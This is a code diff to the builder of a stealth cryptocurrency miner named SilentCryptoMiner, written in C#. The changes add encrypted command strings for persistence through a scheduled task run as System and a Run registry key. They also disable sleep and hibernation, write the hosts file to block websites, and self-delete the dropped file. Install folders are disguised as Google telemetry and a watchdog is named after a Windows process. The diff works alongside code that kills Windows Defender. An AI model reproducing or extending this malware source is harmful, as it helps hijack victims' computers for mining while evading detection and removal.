@@ -294,7 +294,7 @@ namespace SilentCryptoMiner
                     { "loader", Path.Combine(currentDirectory, "loader.bin") }, 
                     { "filename", Path.Combine(currentDirectory, filename) } };
                 var directoryFilter = F.CheckNonASCII(savePath);
-                if (F.BuildErrorTest(directoryFilter.Length > 0, string.Format("Error: Build path \"{0}\" contains the following illegal special characters: {1}, please choose a build path without any special characters.", savePath, string.Join("", directoryFilter.ToString()))))
+                if (F.BuildErrorTest(directoryFilter.Length > 0, string.Format("Error: Build path \"{0}\" contains the following illegal special characters: {1}, please choose a build path without any special characters.", savePath, string.Join("", directoryFilter))))
                     return false;
                 if (F.BuildErrorTest(!F.txtStartDelay.Text.All(new Func<char, bool>(char.IsDigit)), "Error: Start Delay must be a number."))
                     return false;
@@ -375,7 +375,7 @@ namespace SilentCryptoMiner
                     CipherReplace(sb, "#KILLWD", killWDCommands);
                 }
                 File.WriteAllText(paths["filename"] + ".c", sb.ToString(), Encoding.GetEncoding("ISO-8859-1"));
-                RunExternalProgram(paths["tcc"], string.Format("-Wl,-subsystem=windows \"{0}\" {1} \"{2}\" -xa \"{3}\"", filename + ".c", buildResource ? "resource.o" : "", Path.Combine(currentDirectory, @"Includes\syscalls.c"), Path.Combine(currentDirectory, @"Includes\syscallsstubs.asm")), currentDirectory, paths["tcclog"]);
+                RunExternalProgram(paths["tcc"], string.Format("-Wl,-subsystem=windows \"{0}\" {1} \"{2}\" -xa \"{3}\" -m64", filename + ".c", buildResource ? "resource.o" : "", Path.Combine(currentDirectory, @"Includes\syscalls.c"), Path.Combine(currentDirectory, @"Includes\syscallsstubs.asm")), currentDirectory, paths["tcclog"]);
                 File.Delete(paths["resource.o"]);
                 File.Delete(paths["filename"] + ".c");
                 File.Delete(paths["loader"]);
@@ -497,6 +497,17 @@ namespace SilentCryptoMiner
                 stringb.Replace("DefDebug", "true");
             }
 
+            if (F.toggleDisableSleep.Checked)
+            {
+                stringb.Replace("DefDisableSleep", "true");
+            }
+
+            if (F.chkBlockWebsites.Checked)
+            {
+                stringb.Replace("DefBlockWebsites", "true");
+                stringb.Replace("DOMAINSET", $"\"{string.Join("\", \"", F.txtBlockWebsites.Text.Split(','))}\"");
+            }
+
             if (F.xmrGPU)
             {
                 stringb.Replace("DefGPU", "true");
@@ -548,6 +559,11 @@ namespace SilentCryptoMiner
                 {
                     stringb.Replace("DefWatchdog", "true");
                 }
+
+                if (F.toggleAutoDelete.Checked)
+                {
+                    stringb.Replace("DefAutoDelete", "true");
+                }
             }
 
             if (F.chkAssembly.Checked)
@@ -565,22 +581,26 @@ namespace SilentCryptoMiner
                 stringb.Replace("%v4%", F.txtAssemblyVersion4.Text);
             }
 
-            stringb.Replace("#LIBSPATH", F.EncryptString(@"Windows\Libs\"));
-            stringb.Replace("#WATCHDOGPATH", F.EncryptString(@"Windows\Telemetry\"));
+            stringb.Replace("#LIBSPATH", F.EncryptString(@"Google\Libs\"));
+            stringb.Replace("#WATCHDOGPATH", F.EncryptString(@"Google\Telemetry\"));
             stringb.Replace("#WATCHDOGID", F.EncryptString($"\"{F.watchdogID}\""));
             stringb.Replace("#XID", F.EncryptString(F.xid));
             stringb.Replace("#EID", F.EncryptString(F.eid));
             stringb.Replace("#WATCHDOG", F.EncryptString("sihost64"));
-            stringb.Replace("#TASKSCH", F.EncryptString("/c schtasks /create /f /sc onlogon /rl highest /tn \"" + Path.GetFileNameWithoutExtension(F.txtInstallFileName.Text) + "\" /tr \"{0}\""));
-            stringb.Replace("#REGADD", F.EncryptString(@"cmd /c reg add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v """ + Path.GetFileNameWithoutExtension(F.txtInstallFileName.Text) + "\" /t REG_SZ /F /D \"{0}\""));
+            stringb.Replace("#TASKSCH", F.EncryptString($"cmd /c schtasks /create /f /sc onlogon /rl highest /ru \"System\" /tn \"{F.txtInstallEntryName.Text}\" /tr \"{{0}}\""));
+            stringb.Replace("#REGADD", F.EncryptString($"cmd /c reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtInstallEntryName.Text}\" /t REG_SZ /F /D \"{{0}}\""));
+            stringb.Replace("#POWERCFG", F.EncryptString(@"cmd /c powercfg /x -hibernate-timeout-ac 0 & powercfg /x -hibernate-timeout-dc 0 & powercfg /x -standby-timeout-ac 0 & powercfg /x -standby-timeout-dc 0"));
             stringb.Replace("#MINERQUERY", F.EncryptString($"Select CommandLine from Win32_Process WHERE CommandLine LIKE '%{F.minerFind}%'"));
             stringb.Replace("#GPUQUERY", F.EncryptString("SELECT Name, VideoProcessor FROM Win32_VideoController"));
             stringb.Replace("#MINERID", F.EncryptString(F.minerFind));
             stringb.Replace("#SCMD", F.EncryptString("cmd"));
             stringb.Replace("#CMDSTART", F.EncryptString("cmd /c \"{0}\""));
             stringb.Replace("#CMDKILL", F.EncryptString("cmd /c taskkill /f /PID \"{0}\""));
+            stringb.Replace("#CMDDELETE", F.EncryptString("cmd /c choice /C Y /N /D Y /T 3 & Del \"{0}\""));
             stringb.Replace("#SYSTEMROOT", F.EncryptString("SystemRoot"));
             stringb.Replace("#NSLOOKUP", F.EncryptString("System32\\nslookup.exe"));
+            stringb.Replace("#HOSTSPATH", F.EncryptString("drivers/etc/hosts"));
+            stringb.Replace("#HOSTSFORMAT", F.EncryptString("\r\n127.0.0.1       {0}"));
 
             stringb.Replace("#KEY", F.AESKEY);
             stringb.Replace("#SALT", F.SALT);
